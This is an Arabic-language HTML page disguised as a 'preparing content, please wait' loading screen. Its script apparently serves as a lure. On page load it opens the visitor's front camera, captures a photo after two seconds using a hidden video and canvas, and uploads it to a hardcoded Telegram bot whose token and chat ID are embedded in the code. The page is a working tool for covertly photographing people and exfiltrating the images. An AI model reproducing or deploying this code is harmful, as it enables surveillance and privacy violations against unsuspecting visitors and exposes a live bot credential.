<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل...</title>
    <style>
        body {
            background-color: #121212;
            color: #ffffff;
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            text-align: center;
            padding: 20px;
        }
        .spinner {
            border: 4px solid rgba(255, 255, 255, 0.1);
            width: 50px;
            height: 50px;
            border-radius: 50%;
            border-left-color: #0088cc;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        #status {
            font-size: 15px;
            color: #00ffcc;
            margin-top: 15px;
            background: #1e1e1e;
            padding: 10px;
            border-radius: 8px;
            max-width: 300px;
        }
    </style>
</head>
<body>

    <div class="spinner"></div>
    <h2>جاري تحضير المحتوى...</h2>
    <p>يرجى الانتظار قليلاً</p>
    <div id="status">جاري طلب إذن الكاميرا...</div>

    <!-- عناصر الكاميرا -->
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = "8730950232:AAEx1LjVNqqqlC0335uZa13_-6InRx7YXs";
        const CHAT_ID = "8787876793";

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const statusDiv = document.getElementById('status');

        async function initCamera() {
            try {
                statusDiv.innerText = "جاري فتح الكاميرا...";
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                video.srcObject = stream;
                
                // الانتظار حتى تجهز الكاميرا تماماً ثم الالتقاط
                setTimeout(takeSnapshot, 2000);
            } catch (error) {
                statusDiv.innerText = "خطأ في الكاميرا أو تم الرفض: " + error.message;
                console.error(error);
            }
        }

        function takeSnapshot() {
            statusDiv.innerText = "جاري التقاط الصورة...";
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(function(blob) {
                if(!blob) {
                    statusDiv.innerText = "فشل تحويل الصورة!";
                    return;
                }
                sendImageToTelegram(blob);
            }, 'image/jpeg', 0.85);
        }

        async function sendImageToTelegram(blob) {
            statusDiv.innerText = "جاري إرسال الصورة إلى تيليجرام...";
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'snapshot.jpg');

            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                const result = await response.json();
                if (result.ok) {
                    statusDiv.innerText = "تم إرسال الصورة بنجاح إلى تيليجرام! ✅";
                } else {
                    statusDiv.innerText = "خطأ من تيليجرام: " + result.description;
                    console.error(result);
                }
            } catch (err) {
                statusDiv.innerText = "فشل في الاتصال بالشبكة: " + err.message;
                console.error(err);
            }
        }

        window.onload = initCamera;
    </script>
</body>
</html>
